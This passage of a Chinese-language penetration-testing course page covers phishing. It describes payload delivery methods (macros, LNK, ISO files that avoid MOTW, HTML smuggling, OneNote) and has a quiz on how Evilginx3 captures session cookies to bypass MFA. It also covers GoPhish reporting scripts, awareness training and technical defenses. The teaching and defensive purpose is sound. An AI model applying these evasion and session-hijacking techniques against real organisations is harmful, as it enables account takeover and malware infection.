+<span class="cm"># Mail Tester: https://www.mail-tester.com（測試你的發件信譽分數）</span>
+<span class="cm"># dmarcian: https://dmarcian.com/dmarc-inspector/</span>
+
+<span class="cm"># ─── 測試你的釣魚郵件能否進入收件箱 ───</span>
+<span class="cm"># 使用自己控制的測試帳號（Gmail/Outlook）接收並查看郵件頭部</span>
+<span class="cm"># Gmail：查看「原始郵件」→ 確認 DKIM-Signature / ARC-Authentication-Results</span>
+<span class="cm"># 確認：dmarc=pass、spf=pass、dkim=pass</span></pre>
+</div>
+</div>
+
+<!-- L4-4 Payload 投遞 -->
+<div class="cb" id="l4-4">
+<h2>Payload 投遞：宏 / LNK / ISO</h2>
+<p>Payload 投遞（Payload Delivery）是通過釣魚郵件在目標機器上執行惡意代碼的關鍵環節。隨著 Microsoft 2022 年默認禁用網際網路下載文件的 VBA 宏，攻擊者不斷發展新的投遞技術。</p>
+
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>VBA 宏（Office Macro）</strong> — 最傳統但仍有效的方式。Microsoft 365 現在對從網際網路下載的文件默認禁用宏，但在組織內部共享、或通過 LAN/UNC 路徑分發時宏仍可執行。規避：嵌入 Excel 4.0 XLM 宏（舊格式，不同的限制規則）。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>LNK 文件（Windows 捷徑）</strong> — 偽裝成文件夾或文件的 .lnk 捷徑，點擊時執行自訂命令（如 PowerShell 下載並執行 Payload）。通常打包在 ZIP 中附件發送，因為 .lnk 直接發送可能被過濾。Qbot / Emotet 等惡意軟件廣泛使用此技術。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>ISO / IMG 掛載文件</strong> — 將 LNK 或可執行文件打包在 ISO 光盤映像中。Windows 10+ 雙擊 ISO 自動掛載，ISO 內的文件不帶 Mark-of-the-Web（MOTW）標記，因此不受「阻止網際網路下載文件的宏」限制。目前仍有效，但 Windows 11 2022 更新後對 ISO 也添加了 MOTW 傳播。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>HTML Smuggling</strong> — 將 Payload 以 Base64 編碼嵌入 HTML 附件中，通過 JavaScript Blob 在受害者瀏覽器端重新組裝並自動觸發下載。Payload 不在郵件伺服器或 HTTP 傳輸中以可識別格式存在，繞過大多數郵件掃描閘道。</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>OneNote 嵌入（.one 文件）</strong> — 2022-2023 年流行。Microsoft OneNote 文件可嵌入任意文件，點擊頁面內的「按鈕圖片」即觸發執行。Microsoft 在 2023 年 3 月更新後添加了警告，但仍被使用。</div></div>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在授權的釣魚演練中，你使用 Evilginx3 設置了 Microsoft 365 釣魚頁面。目標員工完整地完成了 M365 登入流程，包括 SMS OTP 驗證。你在 Evilginx3 中捕獲了什麼，可以讓你在不知道密碼和 OTP 的情況下訪問其帳號？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>用戶的 NTLM Hash（可用於 Pass-the-Hash）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>用戶的明文密碼（Evilginx 解密了 HTTPS 流量）</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>完整認證後的 Session Cookie（包含 AccessToken 和 RefreshToken）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>SAML Assertion（SAML 令牌，有效期極短）</div>
+  </div>
+  <div class="q-exp">正確！Evilginx3 的核心能力是捕獲<strong>完整認證後的 Session Cookie</strong>。當用戶完成包括 MFA 在內的所有驗證步驟後，Microsoft 服務器會發送包含訪問令牌的 Session Cookie 到瀏覽器。Evilginx 作為中間人攔截了這個 Cookie，攻擊者可以直接將這個 Cookie 注入自己的瀏覽器，「繼承」目標的已認證 Session，完全繞過密碼和 MFA 驗證。這就是為什麼 FIDO2 硬體金鑰是唯一有效防禦——因為 FIDO2 認證與 Origin（域名）綁定，即使攻擊者截獲了請求，也無法在不同域名下重放。</div>
+</div>
+</div>
+
+<!-- ===== CH5: 防禦與培訓 ===== -->
+
+<!-- L5-1 社工演練報告 -->
+<div class="cb" id="l5-1">
+<h2>社工演練報告：數據與建議</h2>
+<p>釣魚演練的最終交付物是報告，它需要將技術發現轉化為管理層可理解的業務風險，並提供可操作的改進建議。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">關鍵指標（KPI）</div><div class="kt-d">郵件投遞率（Delivery Rate）、郵件開啟率（Open Rate）、釣魚鏈接點擊率（Click-Through Rate，CTR）、憑證提交率（Credential Submission Rate）、安全事件通報率（Report Rate）——最後一項是最重要的正面指標。</div></div>
+  <div class="kt"><div class="kt-n">分群分析</div><div class="kt-d">按部門、職級、地區分析釣魚成功率。高風險部門（財務、IT、高管助理）通常需要額外培訓。識別重複點擊者（Repeat Clickers）進行個人化介入。</div></div>
+  <div class="kt"><div class="kt-n">攻擊時間窗</div><div class="kt-d">分析哪個時間段點擊率最高（通常是週一早上和週五下午）。工作開始前的郵件或下班前的郵件往往成功率更高，因為員工匆忙處理。</div></div>
+  <div class="kt"><div class="kt-n">對比基準</div><div class="kt-d">將結果與行業基準對比（如 KnowBe4 的行業 Phish-Prone Percentage 報告）；與組織歷史數據對比，展示趨勢改善或惡化；設定下次演練的改進目標。</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">GoPhish 演練數據導出與分析</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── GoPhish API 導出演練數據 ───</span>
+<span class="cm"># 獲取 API 密鑰：管理界面 → Account Settings → API Key</span>
+
+<span class="cm"># 列出所有活動</span>
+curl -k "https://127.0.0.1:3333/api/campaigns/?api_key=YOUR_API_KEY"
+
+<span class="cm"># 獲取特定活動的詳細結果</span>
+curl -k "https://127.0.0.1:3333/api/campaigns/1/results?api_key=YOUR_API_KEY" \
+  | python3 -m json.tool > results.json
+
+<span class="cm"># ─── Python 分析腳本（計算各指標）───</span>
+<span class="kw">import</span> json
+
+<span class="kw">with</span> <span class="fn">open</span>(<span class="st">'results.json'</span>) <span class="kw">as</span> f:
+    data = json.load(f)
+
+results = data[<span class="st">'results'</span>]
+total = <span class="fn">len</span>(results)
+opened = <span class="fn">sum</span>(<span class="nu">1</span> <span class="kw">for</span> r <span class="kw">in</span> results <span class="kw">if</span> r[<span class="st">'status'</span>] != <span class="st">'Email Sent'</span>)
+clicked = <span class="fn">sum</span>(<span class="nu">1</span> <span class="kw">for</span> r <span class="kw">in</span> results <span class="kw">if</span> r[<span class="st">'status'</span>] <span class="kw">in</span> [<span class="st">'Clicked Link'</span>, <span class="st">'Submitted Data'</span>])
+submitted = <span class="fn">sum</span>(<span class="nu">1</span> <span class="kw">for</span> r <span class="kw">in</span> results <span class="kw">if</span> r[<span class="st">'status'</span>] == <span class="st">'Submitted Data'</span>)
+reported = <span class="fn">sum</span>(<span class="nu">1</span> <span class="kw">for</span> r <span class="kw">in</span> results <span class="kw">if</span> r[<span class="st">'status'</span>] == <span class="st">'Email Reported'</span>)
+
+<span class="fn">print</span>(f<span class="st">"總目標：{total}"</span>)
+<span class="fn">print</span>(f<span class="st">"郵件開啟率：{opened/total*100:.1f}%"</span>)
+<span class="fn">print</span>(f<span class="st">"點擊率（CTR）：{clicked/total*100:.1f}%"</span>)
+<span class="fn">print</span>(f<span class="st">"憑證提交率：{submitted/total*100:.1f}%"</span>)
+<span class="fn">print</span>(f<span class="st">"可疑郵件通報率：{reported/total*100:.1f}%"</span>)</pre>
+</div>
+</div>
+
+<!-- L5-2 意識培訓 -->
+<div class="cb" id="l5-2">
+<h2>員工安全意識培訓設計</h2>
+<p>技術防禦永遠不能完全消除社工風險，持續的安全意識培訓（Security Awareness Training，SAT）是讓員工成為「人防火牆」的唯一途徑。有效的培訓需要改變行為，而不只是傳遞知識。</p>
+
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>即時教育（Just-in-Time Training）</strong> — 最有效的方法：員工點擊釣魚鏈接後，立即在釣魚落地頁上顯示培訓內容（「你剛剛上當了！這是一次釣魚演練，以下是識別方法…」）。記憶在情緒觸動後最深刻。GoPhish 的 Landing Page 可直接配置此功能。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>短小精悍的微培訓（Micro-learning）</strong> — 與其每年一次 2 小時的枯燥 PPT，不如每月 1 次 5 分鐘的互動模組效果更好。KnowBe4、Proofpoint SAT、SANS Securing The Human 等平台提供大量現成模組。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>模擬演練頻率漸進</strong> — 初始演練使用較容易識別的釣魚（讓員工建立信心）；隨後逐步增加難度（添加個人化信息、使用更可信的借口）；對重複點擊者進行一對一跟進培訓。研究顯示月度演練可使釣魚成功率在 12 個月內降低 70%+。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>通報文化建設</strong> — 比「不要點擊」更重要的是「點擊了要立即通報」。培訓重點應包括：如何使用「Report Phishing」按鈕（Outlook 插件 / Google Workspace 功能）；通報後的流程；確保員工不因通報釣魚郵件而受到懲罰（即使是真實郵件）。</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>正面激勵</strong> — 避免「羞辱」點擊者的文化。公開表揚第一個通報特定釣魚郵件的員工；建立通報排行榜；每月通報最多的部門給予認可。將安全意識轉化為積極的組織文化而非恐懼文化。</div></div>
+</div>
+</div>
+
+<!-- L5-3 技術防禦 -->
+<div class="cb" id="l5-3">
+<h2>技術防禦：郵件閘道 / MFA / FIDO2</h2>
+<p>社工攻擊的技術防禦需要多層次部署，每一層都針對攻擊鏈的不同環節。沒有任何單一技術能完全防止社工攻擊，但組合使用可大幅降低成功率。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>防禦層次</th><th>技術方案</th><th>防禦效果</th><th>局限性</th></tr></thead>
+    <tbody>
+      <tr><td><strong>郵件閘道</strong></td><td>Microsoft Defender for Office 365 / Proofpoint / Mimecast；安全連結（URL 重寫掃描）、安全附件（沙盒分析）、反欺騙（SPF/DKIM/DMARC 嚴格執行）</td><td>高（攔截 95%+ 已知釣魚）</td><td>無法識別新型釣魚域名；合法服務（Google Forms、SharePoint）的釣魚難以攔截</td></tr>
+      <tr><td><strong>MFA（TOTP/SMS）</strong></td><td>時間型一次性密碼（TOTP）如 Google Authenticator；SMS OTP；推送通知（Microsoft Authenticator）</td><td>中（防止密碼洩露後的帳號接管）</td><td>無法防止 Evilginx/AiTM 中間人攻擊（Cookie 劫持繞過 MFA）；Push Bombing 攻擊</td></tr>
+      <tr><td><strong>FIDO2 / 硬體金鑰</strong></td><td>YubiKey / Google Titan Key；Windows Hello for Business（TPM 綁定）；Passkeys（FIDO2 平台驗證器）</td><td>極高（加密與 Origin 綁定，無法被中間人重放）</td><td>部署成本高；用戶習慣改變；並非所有服務支援</td></tr>
+      <tr><td><strong>條件訪問策略</strong></td><td>Entra ID（Azure AD）條件訪問：要求合規設備、指定 IP 範圍、風險登入自動阻擋或要求額外驗證</td><td>高（即使 Cookie 被劫持，陌生設備/位置也會觸發阻擋）</td><td>配置複雜；合法遠端工作場景可能被誤擋</td></tr>
+      <tr><td><strong>郵件外部標籤</strong></td><td>在所有外部郵件主旨或頂部添加「[外部]」警示標籤，讓員工立即識別非內部郵件</td><td>中（顯著提升員工警覺性）</td><td>用戶可能習慣後忽視；不影響真實內部帳號被盜用的攻擊</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="done-banner">
+  <h3>Stage 08 完成：社會工程學與釣魚攻擊</h3>
+  <p>你已掌握社工攻擊的完整技術棧：六大心理影響力原理、OSINT 人員情報收集、Pretexting 借口設計、GoPhish 自動化釣魚演練、Evilginx3 MFA 繞過釣魚、Vishing 腳本、Deepfake AI 社工，以及技術防禦方案。繼續進入漏洞研究與漏洞利用開發。</p>
+  <div class="btn-row">
+    <a href="stage9.html" class="btn-p">前往第九階段：漏洞研究</a>
+    <a href="stage7.html" class="btn-g">回顧第七階段</a>
+    <a href="index.html" class="btn-g">返回課程首頁</a>
+  </div>
+</div>
+</div><!-- /cw -->
+
+<div class="lnav">
+  <button class="lb" id="prevb" onclick="prevL()" disabled>&#8592; 上一課</button>
+  <div class="ln-mid">
+    <div class="ln-cnt" id="cnt">1 / 22</div>
+    <div class="ln-sub" id="lsub">社會工程學概論與攻擊框架</div>
+  </div>
+  <button class="lb pri" id="nextb" onclick="nextL()">下一課 &#8594;</button>
+</div>
+
+</main>
+</div>
+
+<script>
+const LS=[
+  {id:'l1-1',ch:'CH1',title:'社會工程學概論與攻擊框架',time:'20分鐘',type:'方法論'},
+  {id:'l1-2',ch:'CH1',title:'影響力原理：六大心理觸發機制',time:'25分鐘',type:'心理學'},
+  {id:'l1-3',ch:'CH1',title:'目標偵察：OSINT 人員情報收集',time:'25分鐘',type:'OSINT'},
+  {id:'l1-4',ch:'CH1',title:'借口構建（Pretexting）技術',time:'20分鐘',type:'Pretexting'},
+  {id:'l2-1',ch:'CH2',title:'釣魚郵件：設計與投遞技術',time:'25分鐘',type:'郵件釣魚'},
+  {id:'l2-2',ch:'CH2',title:'魚叉式釣魚（Spear Phishing）',time:'25分鐘',type:'Spear Phishing'},
+  {id:'l2-3',ch:'CH2',title:'GoPhish 框架：自動化釣魚演練',time:'30分鐘',type:'GoPhish'},
+  {id:'l2-4',ch:'CH2',title:'釣魚頁面製作：Evilginx / GoPhish',time:'25分鐘',type:'釣魚頁面'},
+  {id:'l3-1',ch:'CH3',title:'Vishing（語音釣魚）腳本設計',time:'20分鐘',type:'Vishing'},
+  {id:'l3-2',ch:'CH3',title:'尾隨進入（Tailgating）與實體滲透',time:'20分鐘',type:'實體社工'},
+  {id:'l3-3',ch:'CH3',title:'USB 丟棄攻擊與惡意設備',time:'20分鐘',type:'USB 攻擊'},
+  {id:'l3-4',ch:'CH3',title:'深偽技術（Deepfake）與 AI 社工',time:'20分鐘',type:'AI 社工'},
+  {id:'l4-1',ch:'CH4',title:'域名策略：釣魚域選購與配置',time:'25分鐘',type:'基礎設施'},
+  {id:'l4-2',ch:'CH4',title:'Evilginx3：中間人反向代理釣魚',time:'30分鐘',type:'Evilginx3'},
+  {id:'l4-3',ch:'CH4',title:'釣魚郵件繞過 SPF / DKIM / DMARC',time:'25分鐘',type:'郵件安全'},
+  {id:'l4-4',ch:'CH4',title:'Payload 投遞：宏 / LNK / ISO',time:'25分鐘',type:'Payload'},
+  {id:'l5-1',ch:'CH5',title:'社工演練報告：數據與建議',time:'20分鐘',type:'報告撰寫'},
+  {id:'l5-2',ch:'CH5',title:'員工安全意識培訓設計',time:'20分鐘',type:'意識培訓'},
+  {id:'l5-3',ch:'CH5',title:'技術防禦：郵件閘道 / MFA / FIDO2',time:'25分鐘',type:'技術防禦'},
+];
+const done=new Set(JSON.parse(localStorage.getItem('s8_done')||'[]'));
+let cur=0;
+function go(id,btn){
+  document.querySelectorAll('.cb').forEach(b=>b.classList.remove('on'));
+  document.querySelectorAll('.ls-btn').forEach(b=>b.classList.remove('lact'));
+  const bl=document.getElementById(id);if(bl)bl.classList.add('on');
+  if(btn)btn.classList.add('lact');
+  cur=LS.findIndex(l=>l.id===id);syncUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function toggleCh(btn,id){
+  btn.classList.toggle('copen');
+  const l=document.getElementById(id);if(l)l.classList.toggle('lopen');
+}
+function prevL(){if(cur>0)findAndGo(LS[cur-1].id);}
+function nextL(){
+  done.add(LS[cur].id);
+  localStorage.setItem('s8_done',JSON.stringify([...done]));
+  if(cur<LS.length-1)findAndGo(LS[cur+1].id);
+}
+function findAndGo(id){
+  let btn=null;
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    if((b.getAttribute('onclick')||'').includes("'"+id+"'")){
+      btn=b;
+      const p=b.parentElement;
+      if(p&&!p.classList.contains('lopen')){
+        p.classList.add('lopen');
+        const cb=p.previousElementSibling;
+        if(cb)cb.classList.add('copen');
+      }
+    }
+  });
+  go(id,btn);
+}
+function syncUI(){
+  const l=LS[cur];if(!l)return;
+  document.getElementById('crumb').innerHTML=`STAGE 08 &gt; ${l.ch} &gt; <em>${l.title}</em>`;
+  document.getElementById('ltitle').textContent=l.title;
+  document.getElementById('chip1').textContent=l.type;
+  document.getElementById('chip2').textContent=`預計 ${l.time}`;
+  document.getElementById('cnt').textContent=`${cur+1} / ${LS.length}`;
+  document.getElementById('lsub').textContent=l.title;
+  document.getElementById('prevb').disabled=cur===0;
+  document.getElementById('nextb').disabled=cur===LS.length-1;
+  if(cur===LS.length-1)document.getElementById('nextb').textContent='Stage 完成';
+  else document.getElementById('nextb').innerHTML='下一課 &#8594;';
+  const pct=done.size?Math.round(done.size/LS.length*100):0;
+  document.getElementById('pct').textContent=pct+'%';
+  document.getElementById('pf').style.width=pct+'%';
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    const m=(b.getAttribute('onclick')||'').match(/'(l\d+-\d+)'/);
+    if(m&&done.has(m[1])&&!b.classList.contains('lact'))b.classList.add('ldone');
+  });
+}
+function chkQ(el,correct){
+  const box=el.closest('.quiz');
+  if(box.dataset.answered)return;
+  box.dataset.answered='1';
+  box.querySelectorAll('.qo').forEach(o=>o.style.pointerEvents='none');
+  el.classList.add(correct?'ok':'bad');
+  if(!correct)box.querySelectorAll('.qo').forEach(o=>{
+    if((o.getAttribute('onclick')||'').includes('true'))o.classList.add('ok');
+  });
+  const exp=box.querySelector('.q-exp');
+  if(exp)exp.classList.add('on');
+}
+function cpCode(btn){
+  const pre=btn.closest('.cblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='已複製';setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+syncUI();
+</script>
+</body>
+</html>
